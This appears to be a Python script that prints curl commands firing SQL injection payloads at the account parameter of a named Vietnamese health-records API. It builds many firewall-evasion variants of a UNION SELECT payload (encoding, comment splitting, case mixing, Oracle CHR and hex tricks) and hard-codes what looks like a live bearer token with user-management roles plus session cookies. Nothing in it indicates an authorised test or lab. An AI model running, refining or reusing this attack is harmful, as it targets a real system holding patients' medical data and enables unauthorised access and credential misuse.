from urllib.parse import quote

BASE_URL = "https://bi.hososuckhoe.vn/api-hsskv3/api/userinf"
BEARER = "eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJFSVF5YWpUZDctdE5pMnlyclRaQW5EbElOSE5UMmpOWnlNYVFfenZET1g4In0.eyJleHAiOjE3NzQ3NzcwNzYsImlhdCI6MTc3NDc3MzQ3NiwianRpIjoiZWM1ZmJiYzItN2Y2Mi00YWZjLWJjYmEtNzNmZTU5YmY4NjVjIiwiaXNzIjoiaHR0cHM6Ly9wdHNzbzIudm5jYXJlLnZuL2F1dGgvcmVhbG1zL2hzc2t2MyIsImF1ZCI6WyJyZWFsbS1tYW5hZ2VtZW50IiwiYWNjb3VudCJdLCJzdWIiOiJlZTYxZDAwYy1hMmFjLTRjYmItOTcwYy0wMzRkZTBhMDFmZDEiLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiJiaS1oc3NrIiwic2Vzc2lvbl9zdGF0ZSI6IjdiYmJkMTY3LWE0OGItNDI4OS1hYTNmLWZmMGRmNDgwYzlkZSIsImFsbG93ZWQtb3JpZ2lucyI6WyJodHRwczovL2FwaS1oc3NrLnBodXRoby5nb3Yudm4vKiIsImh0dHBzOi8vaHNzay5waHV0aG8uZ292LnZuIiwiKiIsImh0dHBzOi8vYXBpLWhzc2sucGh1dGhvLmdvdi52biIsImh0dHBzOi8vaHNzay5waHV0aG8uZ292LnZuLyoiXSwicmVhbG1fYWNjZXNzIjp7InJvbGVzIjpbIlJPTEVfU1lUIiwib2ZmbGluZV9hY2Nlc3MiLCJkZWZhdWx0LXJvbGVzLWpoaXBzdGVyIiwidW1hX2F1dGhvcml6YXRpb24iXX0sInJlc291cmNlX2FjY2VzcyI6eyJyZWFsbS1tYW5hZ2VtZW50Ijp7InJvbGVzIjpbIm1hbmFnZS11c2VycyJdfSwiYWNjb3VudCI6eyJyb2xlcyI6WyJtYW5hZ2UtYWNjb3VudCIsIm1hbmFnZS1hY2NvdW50LWxpbmtzIiwidmlldy1wcm9maWxlIl19fSwic2NvcGUiOiJlbWFpbCBoc3NrdjMgcHJvZmlsZSIsInNpZCI6IjdiYmJkMTY3LWE0OGItNDI4OS1hYTNmLWZmMGRmNDgwYzlkZSIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwibWFfdGluaCI6IjI0Iiwicm9sZXMiOlsiUk9MRV9TWVQiLCJvZmZsaW5lX2FjY2VzcyIsImRlZmF1bHQtcm9sZXMtamhpcHN0ZXIiLCJ1bWFfYXV0aG9yaXphdGlvbiJdLCJuYW1lIjoic3l0X2JnZyAxMjMiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJzeXRfYmdnIiwiZ2l2ZW5fbmFtZSI6InN5dF9iZ2cgMTIzIn0.jKOvDs1pzETcFlm3kC-qDg4iDN1R9NPIwXXCVlo7PD2TlV3iK7zZzUAYcP4FwehT1PADtSAqdNDkCLE-PMX-B1ffhwrBbLber_uBgGQbOMUtgEbjQn3Qvpzrw_g5illUMS-2YXKISAsVFjkC7F_zbNUpWft7mn9Bs9BvVNwwpV685trLqzZlrSKM_WditZ8XJCqzYgTf9eCbLs6qdoehl90iP_MQKNM_J15OpFxyirDEvyDrp3W4WMyyWRp1W-JHVSQNGpND-aTFOIsiKqEuBUe2O3E4fp0IH1HvccgH1-DimCqflHNRVp74Bzu2sIxIMNJf_RT0HfJX33NZrYfWdg"


RAW_PAYLOAD = "36331' UNION SELECT 1,2 FROM DUAL--"
COOKIE = "SESSIONID=!UlkhvWz/iJLI3c+OpgppJviLFqMZlykRDTZqgNGdCaB9GqOUwJRliIMsG7+nR9OubZAPvo4AAH7ywA==; TS0176d14d=012b75ff9c63d6dec66eec5bda99b2fdaaef8d26cb5a1d2a2bff055557556231393a8bb49c0061b445e6e8ece67a4542a1b13a01524f22d02e43c8edb1d6c7158683772e48"

CURL_HEADERS = [
    "--header 'Accept: application/json, text/plain, */*'",
    "--header 'Accept-Language: vi,en-US;q=0.9,en;q=0.8'",
    f"--header 'Authorization: Bearer {BEARER}'",
    "--header 'Connection: keep-alive'",
    "--header 'Origin: https://ybadientu.hososuckhoe.vn'",
    "--header 'Referer: https://ybadientu.hososuckhoe.vn/'",
    "--header 'Sec-Fetch-Dest: empty'",
    "--header 'Sec-Fetch-Mode: cors'",
    "--header 'Sec-Fetch-Site: same-site'",
    "--header 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'",
    "--header 'sec-ch-ua: \"Not:A-Brand\";v=\"99\", \"Google Chrome\";v=\"145\", \"Chromium\";v=\"145\"'",
    "--header 'sec-ch-ua-mobile: ?0'",
    "--header 'sec-ch-ua-platform: \"Windows\"'",
]


def variants_f5(payload: str) -> list[tuple[str, str]]:
    out = []
    out.append((payload, "original"))
    out.append((payload.replace(" ", "+"), "plus_space"))
    out.append((payload.replace(" ", "\t"), "tab"))
    out.append((payload.replace(" ", "\n"), "newline"))
    out.append((payload.replace(" ", "\x0b"), "vtab"))
    out.append((payload.replace(" ", "\r"), "cr"))
    out.append((payload.replace(" ", "\x0c"), "ff"))
    out.append((payload.replace(" ", "/**/"), "comment_block"))
    out.append((payload.replace(" ", "%09").replace("'", "%27"), "tab_encoded_quote"))
    out.append(("36331%27+UNION+SELECT+1,2+FROM+DUAL--", "pre_plus_encoded"))
    out.append(("36331%27%09UNION%09SELECT%091%2C2%09FROM%09DUAL--", "pre_tab_encoded"))
    out.append(("36331%27%0aUNION%0aSELECT%0a1%2C2%0aFROM%0aDUAL--", "pre_newline_encoded"))
    out.append(("36331%27/**/UNION/**/SELECT/**/1,2/**/FROM/**/DUAL--", "pre_comment_encoded"))
    case_mix = "36331' UnIoN SeLeCt 1,2 FrOm DuAl--"
    out.append((case_mix, "case_mix"))
    out.append((quote(case_mix, safe=""), "case_mix_encoded"))
    out.append(("36331' UNI/**/ON SEL/**/ECT 1,2 FR/**/OM DUAL--", "split_comment"))
    out.append((quote("36331' UNI/**/ON SEL/**/ECT 1,2 FR/**/OM DUAL--", safe=""), "split_comment_encoded"))
    out.append(("36331%2527 UNION SELECT 1,2 FROM DUAL--", "double_encoded_quote"))
    out.append(("36331' UNION SELECT CHR(49),CHR(50) FROM DUAL--", "chr_oracle"))
    out.append((quote("36331' UNION SELECT CHR(49),CHR(50) FROM DUAL--", safe=""), "chr_oracle_encoded"))
    out.append(("36331' UnIoN SeLeCt 1,2 fRoM dUaL--", "case_random"))
    out.append((quote("36331' UnIoN SeLeCt 1,2 fRoM dUaL--", safe=""), "case_random_encoded"))
    out.append(("36331'||' UNION SELECT 1,2 FROM DUAL--", "concat_oracle"))
    out.append((quote("36331'||' UNION SELECT 1,2 FROM DUAL--", safe=""), "concat_oracle_encoded"))
    hex_part = "36331'#UnIon#SeLeCt#1,2#FrOm#DuAl--".encode("utf-8").hex()
    out.append(("36331" + "0x" + hex_part, "account_hex_prefix"))
    out.append(("36331" + "0x" + "33363333312723754e694f6e2373456c45635423", "account_hex_0x"))
    out.append(("36331x" + "33363333312723754e694f6e2373456c45635423", "account_hex_x"))
    return out


def main():
    payloads = variants_f5(RAW_PAYLOAD)
    h = " \\\n  ".join(CURL_HEADERS)
    for i, (payload, name) in enumerate(payloads):
        q = quote(payload, safe="") if not payload.startswith("36331%") else payload
        url = f"{BASE_URL}?account={q}"
        curl = f"curl --location '{url}' \\\n  {h}"
        print(f"\n# --- {i+1}. {name} ---\n{curl}\n")


if __name__ == "__main__":
    main()
